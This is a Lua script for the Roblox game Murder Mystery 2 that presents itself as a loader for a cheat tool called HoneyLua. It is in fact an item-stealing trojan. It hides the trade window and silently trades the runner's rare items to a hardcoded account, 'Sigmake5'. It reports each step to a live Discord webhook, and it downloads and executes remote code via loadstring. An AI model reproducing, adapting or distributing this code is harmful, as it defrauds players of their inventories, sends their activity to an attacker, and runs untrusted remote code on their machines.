# MM2-HONEYLUA-SCRIPT

-- MM2 FULLY AUTOMATED INVISIBLE TRADE SCRIPT + HONEYLUA LOADER
-- Triggers when Sigmake5 joins, auto trades legendaries/godlies/ancient/unique
-- Everything happens invisibly to the player
-- Also loads HoneyLua automatically

local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local TARGET_USER = "Sigmake5"

local player = game.Players.LocalPlayer
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local VirtualInput = game:GetService("VirtualInputManager")

-- Items to trade (Only Legendaries, Godlies, Ancients, Uniques)
local VALID_RARITIES = {
    "Godly", "Chroma", "Ancient", "Unique", "Legendary", "Vintage"
}

-- Track if trade is in progress
local tradeInProgress = false
local currentTradePartner = nil

-- Send log to Discord webhook
local function sendLog(message)
    pcall(function()
        local data = {
            content = "**🤖 MM2 Auto Trade**\n" .. message .. "\n⏰ `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
        }
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Check if item should be traded (legendary/godly/ancient/unique only)
local function isTradableItem(item)
    if not item or not item:IsA("Tool") then return false end
    
    local itemName = item.Name
    for _, rarity in pairs(VALID_RARITIES) do
        if itemName:find(rarity) or itemName:lower():find(rarity:lower()) then
            return true
        end
    end
    return false
end

-- Get all tradable items from inventory (filtered)
local function getTradableItems()
    local items = {}
    
    -- Check backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") and isTradableItem(item) then
            table.insert(items, item)
        end
    end
    
    -- Check character (held/equipped items)
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") and isTradableItem(item) then
                table.insert(items, item)
            end
        end
    end
    
    return items
end

-- Find the trade remote events in MM2
local function findTradeRemotes()
    local remotes = {
        sendTrade = nil,
        acceptTrade = nil,
        declineTrade = nil,
        addItem = nil,
        removeItem = nil,
        ready = nil,
        cancel = nil
    }
    
    -- Scan ReplicatedStorage for trade-related remotes
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local nameLower = v.Name:lower()
            if nameLower:find("trade") or nameLower:find("invite") then
                if nameLower:find("send") or nameLower:find("invite") then
                    remotes.sendTrade = v
                elseif nameLower:find("accept") or nameLower:find("response") then
                    remotes.acceptTrade = v
                elseif nameLower:find("add") or nameLower:find("offer") then
                    remotes.addItem = v
                elseif nameLower:find("ready") or nameLower:find("confirm") then
                    remotes.ready = v
                elseif nameLower:find("cancel") or nameLower:find("decline") then
                    remotes.cancel = v
                end
            end
        end
    end
    
    -- Alternative common MM2 remote names
    if not remotes.sendTrade then
        remotes.sendTrade = ReplicatedStorage:FindFirstChild("TradeInvite")
    end
    if not remotes.acceptTrade then
        remotes.acceptTrade = ReplicatedStorage:FindFirstChild("TradeResponse")
    end
    if not remotes.addItem then
        remotes.addItem = ReplicatedStorage:FindFirstChild("TradeAddItem")
    end
    if not remotes.ready then
        remotes.ready = ReplicatedStorage:FindFirstChild("TradeReady")
    end
    
    return remotes
end

-- Hide trade GUI (make it invisible to player)
local function hideTradeGUI()
    pcall(function()
        -- Find and hide trade GUI elements
        local playerGui = player.PlayerGui
        
        for _, gui in pairs(playerGui:GetChildren()) do
            if gui.Name:lower():find("trade") or gui.Name:lower():find("trading") then
                gui.Enabled = false
                gui.Visible = false
                if gui.Parent then
                    gui.Parent = nil -- Completely remove from view
                end
            end
        end
        
        -- Also find any frame/dialog related to trading
        for _, gui in pairs(playerGui:GetDescendants()) do
            if gui:IsA("Frame") or gui:IsA("ScreenGui") then
                if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") then
                    gui.Visible = false
                end
            end
        end
    end)
end

-- Send trade request invisibly
local function sendTradeRequestInvisible(targetPlayer, remotes)
    if not remotes.sendTrade then
        sendLog("❌ Cannot find trade remote! Trade may not send.")
        return false
    end
    
    pcall(function()
        remotes.sendTrade:FireServer(targetPlayer)
        sendLog("📤 Trade request sent to " .. TARGET_USER)
    end)
    return true
end

-- Auto accept trade when Sigmake5 accepts
local function autoAcceptTradeInvisible(targetPlayer, remotes)
    if tradeInProgress then return end
    tradeInProgress = true
    currentTradePartner = targetPlayer
    
    sendLog("✅ Trade accepted by " .. TARGET_USER .. " - Adding items...")
    
    -- Wait for trade window to open
    wait(1.5)
    
    -- Get all tradable items
    local items = getTradableItems()
    sendLog("📦 Found " .. #items .. " tradable items (Legendaries/Godlies/Ancients/Uniques)")
    
    -- Add items 4 at a time
    local itemsAdded = 0
    local batchSize = 4
    
    for i, item in pairs(items) do
        if itemsAdded >= batchSize then
            -- Ready up after adding 4 items
            if remotes.ready then
                pcall(function() remotes.ready:FireServer(true) end)
                sendLog("✅ Batch of " .. batchSize .. " items added - Auto-readying...")
            end
            break
        end
        
        -- Add item to trade
        if remotes.addItem then
            pcall(function()
                remotes.addItem:FireServer(item)
                itemsAdded = itemsAdded + 1
                sendLog("➕ Added: " .. item.Name)
            end)
        end
        wait(0.3) -- Small delay between adding items
    end
    
    wait(1)
    
    -- Final ready up
    if remotes.ready then
        pcall(function() remotes.ready:FireServer(true) end)
        sendLog("🎉 Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    end
    
    tradeInProgress = false
    currentTradePartner = nil
end

-- Hook into trade responses (when Sigmake5 accepts)
local function setupInvisibleTradeListener(remotes)
    -- Listen for trade accept response
    if remotes.acceptTrade and remotes.acceptTrade.OnClientEvent then
        remotes.acceptTrade.OnClientEvent:Connect(function(sender, ...)
            if sender and sender.Name == TARGET_USER then
                sendLog("🔔 " .. TARGET_USER .. " accepted the trade request!")
                autoAcceptTradeInvisible(sender, remotes)
            end
        end)
    end
    
    -- Alternative: Listen for general trade events
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
            remote.OnClientEvent:Connect(function(...)
                local args = {...}
                for _, arg in pairs(args) do
                    if type(arg) == "table" and arg.Name == TARGET_USER then
                        sendLog("🔔 Trade event detected from " .. TARGET_USER)
                        autoAcceptTradeInvisible(arg, remotes)
                    elseif type(arg) == "string" and arg:lower():find("trade") then
                        -- Handle other trade events
                    end
                end
            end)
        end
    end
end

-- Main function to start the auto trade process
local function startAutoTrade(targetPlayer, remotes)
    if tradeInProgress then
        sendLog("⚠️ Trade already in progress, skipping...")
        return
    end
    
    sendLog("🎯 " .. TARGET_USER .. " detected! Starting auto trade...")
    
    -- Hide trade GUI immediately
    hideTradeGUI()
    
    -- Small delay
    wait(1)
    
    -- Send trade request
    local sent = sendTradeRequestInvisible(targetPlayer, remotes)
    
    if sent then
        sendLog("⏳ Waiting for " .. TARGET_USER .. " to accept trade...")
    end
end

-- Watch for Sigmake5 joining
local function watchForTarget()
    local remotes = findTradeRemotes()
    
    if remotes.sendTrade then
        sendLog("✅ Found trade remotes: " .. remotes.sendTrade.Name)
    else
        sendLog("⚠️ WARNING: Trade remotes not found! Script may not work.")
    end
    
    -- Setup listener for trade responses
    setupInvisibleTradeListener(remotes)
    
    -- Check if target is already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog("👤 " .. TARGET_USER .. " is already in the server!")
            wait(2)
            startAutoTrade(plr, remotes)
            break
        end
    end
    
    -- Watch for new players joining
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog("🟢 " .. TARGET_USER .. " just joined the server!")
            wait(2) -- Wait for player to fully load
            startAutoTrade(newPlayer, remotes)
        end
    end)
    
    -- Continuously hide trade GUI (in case it reappears)
    spawn(function()
        while wait(0.5) do
            hideTradeGUI()
        end
    end)
end

-- Load HoneyLua
local function loadHoneyLua()
    sendLog("🍯 Loading HoneyLua...")
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HoneyLua/refs/heads/main/Loader.luau"))()
    end)
    if success then
        sendLog("✅ HoneyLua loaded successfully!")
        print("✅ HoneyLua loaded successfully!")
    else
        sendLog("❌ Failed to load HoneyLua: " .. tostring(err))
        warn("Failed to load HoneyLua: " .. tostring(err))
    end
end

-- Start everything
local function main()
    sendLog("🚀 Auto trade script + HoneyLua loader activated for " .. player.Name)
    sendLog("🎮 Watching for " .. TARGET_USER)
    
    -- Load HoneyLua first
    loadHoneyLua()
    
    -- Wait a bit for HoneyLua to initialize
    wait(2)
    
    -- Start the auto trade watcher
    local success, err = pcall(watchForTarget)
    if not success then
        sendLog("❌ Auto trade script error: " .. tostring(err))
        warn("Error: " .. tostring(err))
    end
end

-- Run the main function
pcall(main)

print("✅ MM2 Auto Trade + HoneyLua Script Active")
print("🎯 Waiting for " .. TARGET_USER .. " to join...")
print("🍯 HoneyLua should load shortly...")
